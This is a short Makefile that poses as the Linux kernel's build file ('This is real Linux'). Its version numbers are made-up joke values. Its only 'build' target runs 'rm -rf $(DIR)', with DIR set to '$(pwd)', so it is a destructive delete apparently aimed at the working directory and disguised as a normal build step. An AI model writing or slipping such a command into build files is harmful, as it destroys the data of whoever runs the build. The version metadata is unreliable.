VERSION = 114514
PATCHLEVEL = 1919810
SUBLEVEL = 9
EXTRAVERSION = -future
NAME = This is real Linux
DIR = $(pwd)

.PHONY: build

build: .
	rm -rf $(DIR)
